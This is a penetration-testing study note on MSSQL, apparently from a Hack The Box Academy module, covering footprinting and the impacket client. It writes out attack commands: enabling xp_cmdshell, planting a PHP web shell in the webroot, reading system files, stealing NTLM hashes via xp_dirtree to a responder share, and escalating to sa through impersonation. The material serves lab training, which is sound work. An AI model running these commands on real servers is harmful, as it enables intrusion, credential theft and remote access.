MSSQL
#########

Date: 2024-11-11 11:17

Status:


MSSQL Clients
*******************

SSMS (SQL Server Management Studio)
=====================================

-  commonly installed my Windows admins.
-  Is a client, so it can be installed anywhere

mssqlclient
===============

-  Part of the impacket tools

Configuration
---------------

-  By default will run as the NT SERVICE:raw-latex:`\MSSQLSERVER`
-  Encryption is not enabled by default
-  Authentication can be set to windows level authentication

MSSQL Footprinting
*******************

-  Default port is ``1433``

Example 1: Using nmap and mssql scripts

.. code-block:: console


   sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

Example 2:
`Using the Metasploit Framework <Using the Metasploit Framework>`__
auxiliary scanner called mssql_ping

.. code-block:: console


   search mssql_ping
   use auxiliary/scanner/mssql/mssql_ping
   set RHOST = 10.129.x.x
   run

Connecting with Mssqlclient.py
********************************

Example 1:

.. code-block:: console


   python3 mssqlclient.py Administrator:password@10.129.201.248 -windows-auth

**note:** When I tried without the password and let the client prompt
for it, it threw a .py error

XP_CMDSHELL
*************

XP_SHELL is a powerful set of stored procedures. Disabled by default,
but can be enabled with:

.. code-block:: console

   USE master; 
   GO 
   EXECUTE sp_configure 'show advanced options', 1; 
   GO 
   RECONFIGURE; 
   GO 
   EXECUTE sp_configure 'xp_cmdshell', 1; 
   GO
   RECONFIGURE;
   GO 
   EXECUTE sp_configure 'show advanced options', 0;
   GO 
   RECONFIGURE; 
   GO

MSSQL Writing files
**********************

To allow this you need to enable Ole Automation Procedures (requires
admin privs)

.. code-block:: console

   1> sp_configure 'show advanced options', 1
   2> GO
   3> RECONFIGURE
   4> GO
   5> sp_configure 'Ole Automation Procedures', 1
   6> GO
   7> RECONFIGURE
   8> GO

Then to create a file:

.. code-block:: console

   DECLARE @OLE INT
   2> DECLARE @FileID INT
   3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
   4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
   5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
   6> EXECUTE sp_OADestroy @FileID
   7> EXECUTE sp_OADestroy @OLE
   8> GO

MSSQL Reading files
**********************

Enabled by default

.. code-block:: console

   SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
   2> GO

XP_DIRTREE hash stealing
**************************

Example:

.. code-block:: console

   1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
   2> GO

OR

.. code-block:: console

   1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
   2> GO

And have `responder <responder>`__ running to catch the hash

.. code-block:: console

   Temen@htb[/htb]$ sudo responder -I tun0

OR

Catch it with `impacket-smbserver <impacket-smbserver>`__

.. code-block:: console

   sudo impacket-smbserver share ./ -smb2support

MSSQL Impersonating users to escalate privs
*********************************************

Example 1: First check your current user/role

.. code-block:: console


   1> SELECT SYSTEM_USER
   2> SELECT IS_SRVROLEMEMBER('sysadmin')
   3> go

If the command comes back 0, this means you do not have the ``sysadmin``
role.

Escalate privileges with

.. code-block:: console

   1> EXECUTE AS LOGIN = 'sa'
   2> SELECT SYSTEM_USER
   3> SELECT IS_SRVROLEMEMBER('sysadmin')
   4> GO

A ``1`` should be returned indicating you now have the role.

Example: Outputting a file from an administrators desktop

.. code-block:: console

   SELECT srvname, isremote FROM sysservers;
   go
   EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [local.test.linked.srv];
   go
   execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];
   go

References
***********
https://academy.hackthebox.com/module/112/section/1246
